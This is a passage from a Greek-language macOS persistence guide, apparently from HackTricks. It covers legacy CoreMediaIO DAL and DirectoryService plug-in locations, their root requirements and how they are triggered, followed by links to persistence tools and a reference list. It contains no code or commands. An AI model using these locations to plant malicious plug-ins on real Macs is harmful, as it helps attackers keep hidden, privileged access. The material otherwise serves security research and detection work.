Ελάχιστο παράδειγμα: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Μηχανισμός παλαιού τύπου:** Καταργήθηκε από το macOS 12.3. Το macOS 14.1 και νεότερες εκδόσεις απενεργοποιούν από προεπιλογή τα video plug-ins παλαιού τύπου. Για να λειτουργήσει αυτή η διαδρομή, ο χρήστης πρέπει να επαναφέρει την υποστήριξη video παλαιού τύπου από το Recovery· η ύπαρξη ενός εγγράψιμου καταλόγου από μόνη της δεν αρκεί. [Τρέχουσες οδηγίες υποστήριξης της Apple](https://support.apple.com/en-us/108387).
- Απαιτούνται δικαιώματα root για εγγραφή στον κατάλογο των plug-in. Η εκτέλεση κώδικα εξαρτάται από συμβατό client που εξακολουθεί να φορτώνει DAL plug-ins· αυτό δεν δοκιμάστηκε κατά τον χρόνο εκτέλεσης στο macOS 26.

#### Τοποθεσία

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - Απαιτούνται δικαιώματα root
  - **Ενεργοποίηση:** Ένας συμβατός client κάμερας απαριθμεί συσκευές **αφού αποκατασταθεί η υποστήριξη παλαιού τύπου**. Η επικύρωση βιβλιοθηκών του client μπορεί να εμποδίσει ένα plug-in τρίτου κατασκευαστή.

#### Περιγραφή & Εκμετάλλευση

Τα plug-ins **DAL** (Device Abstraction Layer) του CoreMediaIO φορτώνονταν εντός διεργασίας από ορισμένες εφαρμογές κάμερας. Η [παρουσίαση της Apple για τις camera extensions](https://developer.apple.com/videos/play/wwdc2022/10022/) αναφέρει συγκεκριμένα ότι τα DAL plug-ins παλαιού τύπου **δεν** λειτουργούσαν με το FaceTime, το QuickTime Player ή το Photo Booth, και ότι πολλοί άλλοι clients επιβάλλουν επικύρωση βιβλιοθηκών. Οι σύγχρονες [Core Media I/O extensions](https://developer.apple.com/documentation/coremediaio) εκτελούνται εκτός διεργασίας, με ξεχωριστό μοντέλο εγκατάστασης και έγκρισης. Η ιστορική τεχνική εντός διεργασίας δεν συνεπάγεται γενική παράκαμψη του Camera TCC στο τρέχον macOS.<sup>[[53]](#references)[[54]](#references)</sup>

Παρατήρηση μόνο για ανάγνωση στο macOS 26: Ο κατάλογος `/Library/CoreMediaIO/Plug-Ins/DAL` υπάρχει και ανήκει στον root. Δεν επαληθεύτηκε ούτε η υποστήριξη παλαιού τύπου ούτε η φόρτωση σε οποιονδήποτε client.

### Directory Service Plugins

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Μηχανισμός παλαιού τύπου, υπό προϋποθέσεις:** Απαιτούνται δικαιώματα root για την εγκατάσταση και ένα plug-in που έχει πράγματι ρυθμιστεί και φορτωθεί. Το API των plug-in του DirectoryService έχει καταργηθεί· συμβουλευτείτε τη ρύθμιση Open Directory του Mac-στόχου πριν θεωρήσετε ότι αυτό ενεργοποιείται κατά την εκκίνηση.

#### Τοποθεσία

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - Απαιτούνται δικαιώματα root
  - **Ενεργοποίηση:** Το `dspluginhelperd` φορτώνει ένα κατάλληλο, ρυθμισμένο plug-in όταν το χρειάζεται το Open Directory. Ο [οδηγός χρόνου εκτέλεσης plug-in της Apple](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) αναφέρει ότι plug-in που δεν έχουν ρυθμιστεί για εκκίνηση ενδέχεται να φορτωθούν καθυστερημένα όταν ανοιχτεί ο κόμβος τους.

#### Περιγραφή & Εκμετάλλευση

Το `dspluginhelperd` υποστηρίζει πακέτα plug-in του DirectoryService παλαιού τύπου. Ένα κακόβουλο plug-in μπορεί να αποτελέσει διαδρομή εκτέλεσης με αυξημένα δικαιώματα, εφόσον γίνει αποδεκτό και ενεργοποιηθεί το plug-in παλαιού τύπου· πρόκειται για ξεχωριστό μηχανισμό από τα PAM και Authorization Plugins. Η ύπαρξη του καταλόγου δεν αποδεικνύει ότι ένα νέο plug-in που θα εγγραφεί θα εκτελεστεί στην επόμενη εκκίνηση. Τα τοπικά εγχειρίδια `dspluginhelperd(8)` και `opendirectoryd(8)` της Apple στο macOS 26.5 εξακολουθούν να αναφέρουν το helper και αυτή τη διαδρομή παλαιού τύπου.<sup>[[53]](#references)</sup>

Παρατήρηση μόνο για ανάγνωση στο macOS 26: Οι κατάλογοι `/Library/DirectoryServices/PlugIns` και `/usr/libexec/dspluginhelperd` υπάρχουν. Κατά τη διάρκεια αυτής της δοκιμής δεν εγκαταστάθηκε, ρυθμίστηκε ή φορτώθηκε κανένα plug-in.

## Τεχνικές και εργαλεία persistence

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, η χρονιά του Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Πέρα από τα γνωστά LaunchAgents - 1 - αρχεία εκκίνησης shell](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Πέρα από τα γνωστά LaunchAgents - 18 - X11 και XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Πέρα από τα γνωστά LaunchAgents - 21 - εφαρμογές που ανοίγουν ξανά](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Πέρα από τα γνωστά LaunchAgents - 20 - προτιμήσεις Terminal](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Πέρα από τα γνωστά LaunchAgents - 13 - Audio Plugins](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Plug-ins Audio Unit (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Πέρα από τα γνωστά LaunchAgents - 12 - QuickLook Plugins](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Πέρα από τα γνωστά LaunchAgents - 22 - LoginHook και LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Πέρα από τα γνωστά LaunchAgents - 4 - εργασίες cron](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Πέρα από τα γνωστά LaunchAgents - 2 - εκκίνηση iTerm2](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Πέρα από τα γνωστά LaunchAgents - 7 - xbar plugins](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Πέρα από τα γνωστά LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Πέρα από τα γνωστά LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Πέρα από τα γνωστά LaunchAgents - 3 - στοιχεία σύνδεσης](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Πέρα από τα γνωστά LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Πέρα από τα γνωστά LaunchAgents - 24 - ενέργειες φακέλων](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Ενέργειες φακέλων για persistence στο macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Πέρα από τα γνωστά LaunchAgents - 27 - συντομεύσεις Dock](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Πέρα από τα γνωστά LaunchAgents - 17 - επιλογείς χρωμάτων](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Πέρα από τα γνωστά LaunchAgents - 26 - Finder Sync Plugins](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Ανάλυση του persistence του "Mac File Opener" (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Πέρα από τα γνωστά LaunchAgents - 16 - Screen Saver](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Διατηρώντας την πρόσβασή σας: screensavers για persistence στο macOS (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Πέρα από τα γνωστά LaunchAgents - 11 - εισαγωγείς Spotlight](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Πέρα από τα γνωστά LaunchAgents - 9 - Preference Pane](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Πέρα από τα γνωστά LaunchAgents - 19 - περιοδικά scripts](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Πέρα από τα γνωστά LaunchAgents - 5 - Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Πέρα από τα γνωστά LaunchAgents - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Επίμονη κλοπή διαπιστευτηρίων με Authorization Plugins (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Πέρα από τα γνωστά LaunchAgents - 30 - το αρχείο ρυθμίσεων man - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Πέρα από τα γνωστά LaunchAgents - 25 - modules Apache2](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Πέρα από τα γνωστά LaunchAgents - 31 - πλαίσιο ελέγχου BSM](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Πέρα από τα γνωστά LaunchAgents - 23 - emond, ο δαίμονας παρακολούθησης συμβάντων](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Πέρα από τα γνωστά LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Πέρα από τα γνωστά LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [Πέρα από τα γνωστά LaunchAgents - 10 - αρχεία script εφαρμογών](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [Πέρα από τα γνωστά LaunchAgents - 32 - Dock Tile Plugins](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [Πέρα από τα γνωστά LaunchAgents - 33 - Widgets](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [Πέρα από τα γνωστά LaunchAgents - 34 - εργασίες εκκίνησης launchd](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [Πέρα από τα γνωστά LaunchAgents - 35 - persistence μέσω NVRAM (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [Χρήση email για persistence στο OS X (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Ύποπτη τροποποίηση Plist κανόνα Apple Mail (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Κακόβουλα Profiles - μία από τις σοβαρότερες απειλές για Mac (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [Η τέχνη του Mac Malware Τόμος 1 - Κεφ. 0x2 Persistence (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [Ανάλυση του CVE-2024-44243, παράκαμψης SIP του macOS μέσω kernel extensions (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [RCE και εξαγωγή API Token μέσω αρχείων έργων Claude Code (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [Νέα ευπάθεια στα GitHub Copilot και Cursor - κερκόπορτα στο αρχείο Rules (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome - εναλλακτικές μέθοδοι εγκατάστασης (External Extensions)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Αφαίρεση του ExtensionInstallForcelist στο Chrome σε Mac (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Σχετικά με τη συγγραφή Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Απομακρυσμένη εκμετάλλευση Mac μέσω προσαρμοσμένων URL schemes (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Δύο τεχνικές persistence στο macOS που καταχρώνται plug-ins (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [Ελάχιστο παράδειγμα CoreMediaIO DAL (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: Ανάλυση ευπάθειας TCC του macOS βασισμένης στο Spotlight (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Τεκμηρίωση της ενότητας Python `site` (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
{{#include ../banners/hacktricks-training.md}}
